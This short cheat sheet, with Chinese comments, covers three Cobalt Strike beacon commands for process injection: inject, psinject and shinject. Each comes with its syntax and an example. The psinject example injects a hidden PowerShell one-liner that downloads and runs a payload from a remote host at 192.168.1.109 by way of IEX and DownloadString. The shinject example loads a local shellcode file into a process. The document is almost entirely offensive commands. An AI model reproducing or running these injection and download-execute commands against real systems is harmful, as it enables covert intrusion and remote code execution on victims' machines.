# inject

```shell
# inject 进程 PID 架构位数 监听器
# beacon> help inject
inject 2548 x64 httpLis
```

# psinject

```shell
# psinject 进程 PID 架构位数 命令集 参数
# beacon> help psinject
# 使用 one-liner payload 注入进程
psinject 2548 x64 powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.109:80/a'))"
```

# shinject

```shell
# shinject 进程 PID 架构位数 shellcode.bin文件的本地路径
# beacon> help shinject
shinject 2484 x64 /root/beacon.bin
```
